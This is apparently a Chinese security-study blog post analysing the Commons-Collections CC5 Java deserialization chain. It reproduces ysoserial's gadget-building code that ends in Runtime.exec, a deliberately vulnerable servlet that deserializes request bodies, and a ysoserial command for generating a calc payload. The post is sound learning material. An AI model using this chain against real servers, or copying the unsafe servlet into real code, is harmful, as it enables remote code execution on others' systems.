<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/A7RONKp00JbqTKSUKwkBsg)

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XW1GBOHiav9uX70icy1cOFlOX4ibcxbDicZheZz9UMiawDNGP8vPexVBfibJKibrJOhooUgtLuln0yBqSflA/640?wx_fmt=png)

前言
--

学习 cc5 反序列化链。在 CC5 链中 ysoserial 给出的提示是需要 JDK1.8 并且 SecurityManager 需要是关闭的。在实际尝试中`jdk1.7.0_80`也是可以的；JDK7u21 不行，发现`badAttributeValueExpException`没有`readObject()`方法。

SecurityManager 是 java 的安全管理器，当运行未知的 Java 程序的时候，该程序可能有恶意代码（删除系统文件、重启系统等），为了防止运行恶意代码对系统产生影响，需要对运行的代码的权限进行控制，这时候就要启用 Java 安全管理器。该管理器默认是关闭的。

ysoserial 中的 CC5 payload 构造
---------------------------

先看下 yso 中 cc5 这条链的 payload 是怎么构造的，后续我们再分析反序列化的过程。

```
public BadAttributeValueExpException getObject(final String command) throws Exception {
final String[] execArgs = new String[] { command };
// inert chain for setup
final Transformer transformerChain = new ChainedTransformer(
        new Transformer[]{ new ConstantTransformer(1) });
// real chain for after setup
final Transformer[] transformers = new Transformer[] {
new ConstantTransformer(Runtime.class),
new InvokerTransformer("getMethod", new Class[] {
String.class, Class[].class }, new Object[] {
"getRuntime", new Class[0] }),
new InvokerTransformer("invoke", new Class[] {
Object.class, Object[].class }, new Object[] {
null, new Object[0] }),
new InvokerTransformer("exec",
new Class[] { String.class }, execArgs),
new ConstantTransformer(1) };

final Map innerMap = new HashMap();

final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

BadAttributeValueExpException val = new BadAttributeValueExpException(null);
Field valfield = val.getClass().getDeclaredField("val");
   Reflections.setAccessible(valfield);
valfield.set(val, entry);

Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

return val;
}

```

前面生成`ChainedTransformer`利用链的过程跟 cc1 一致，不作过多讲解。

```
final Map innerMap = new HashMap();

final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

```

将`ChainedTransformer`绑定到 map 对象上，当调用 get 方法的时候，就会调用到`ChainedTransformer`的`transform`方法，从而引起连锁反应执行命令。  

### TiedMapEntry 类

```
TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

BadAttributeValueExpException val = new BadAttributeValueExpException(null);
Field valfield = val.getClass().getDeclaredField("val");
Reflections.setAccessible(valfield);
valfield.set(val, entry);

Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

return val;

```

这里实例化一个`TiedMapEntry`对象，传入其构造函数的参数为 LazyMap 对象和一个占位字符串。

随后通过反射的方法，将`BadAttributeValueExpException`对象的`val`属性赋值为前面 new 的`TiedMapEntry`对象，并将该`BadAttributeValueExpException`对象作为序列化对象返回。

我们看下`TiedMapEntry`类的相关源码：

```
public TiedMapEntry(Map map, Object key) {
   this.map = map;
   this.key = key;
}

public Object getKey() {
   return this.key;
}

public Object getValue() {
   return this.map.get(this.key);
}

```

上面传入构造函数的分别是`LazyMap`实例化对象和占位字符串。

在`getValue`这个方法中，调用`this.map.get()`方法，就和前面的串联起来达成命令执行了。

```
public String toString() {
   return this.getKey() + "=" + this.getValue();
}

```

而在`toString()`方法中，就调用了`getValue`这个方法。  

反序列化过程分析
--------

### 1. 创建 web 项目

创建一个 maven web 项目，并创建一个 servlet 如下：

```
package com.example;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;

@WebServlet("/s1")
public class Servlet1 extends HttpServlet {
   @Override
   protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
       InputStream inputStream = req.getInputStream();
       ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
       try {
           objectInputStream.readObject();
      } catch (ClassNotFoundException e) {
           e.printStackTrace();
      }
  }

   @Override
   protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
       this.doGet(req, resp);
  }
}

```

pom.xml 中添加`commons-collections` 3.1 依赖

```
<dependency>
<groupId>commons-collections</groupId>
<artifactId>commons-collections</artifactId>
<version>3.1</version>
</dependency>

```

使用 yso 生成 calc 命令的 payload：

```
java -jar CommonsCollections5 calc > cc5.ser

```

利用 burp 发送 payload，成功执行命令弹出计算器：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XW1GBOHiav9uX70icy1cOFlOXhSVk5ibtP3PMoUIrRY3EKCyQDwPdp5n4aobMP10Pjxibsz8kaQRx49bQ/640?wx_fmt=png)  

### 2. 反序列化链分析

#### BadAttributeValueExpException.readObject()

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XW1GBOHiav9uX70icy1cOFlOXlgXFcjia5XcBiavjaSlPQ7WfvoCZeKVrWt4ia4jllzaMia7DNTNz8yyvCA/640?wx_fmt=png)

从序列化数据中获取`BadAttributeValueExpException`对象的`val`属性值，赋值给`valObj`变量，其为`TiedMapEntry`的对象。

如果 SecurityManager 关闭，则会调用`TiedMapEntry.toString()`方法。

#### TiedMapEntry.toString()

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XW1GBOHiav9uX70icy1cOFlOXvTjRAI6Sf0b38OAiccJoSgxvOCeWplxq6uE4cnYC0BEBjLflMVysC8g/640?wx_fmt=png)

在 toString 方法中，会调用`TiedMapEntry.getValue()`方法：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XW1GBOHiav9uX70icy1cOFlOXcJ6ibJG2TfJtyLia53qK7Ipadj45icE9ct1ToDwibdxibO11qMNVfic6IUEg/640?wx_fmt=png)

在 getValue 方法中，调用`this.map.get()`方法，`this.map`对象就是前面我们构造序列化数据时的 LazyMap，当调用 get 方法的时候，就会调用到 ChainedTransformer 的 transform 方法，从而引起连锁反应执行命令。该部分的分析可以参看 cc1 反序列化分析。

参考链接
----

https://www.cnblogs.com/nice0e3/p/13890340.html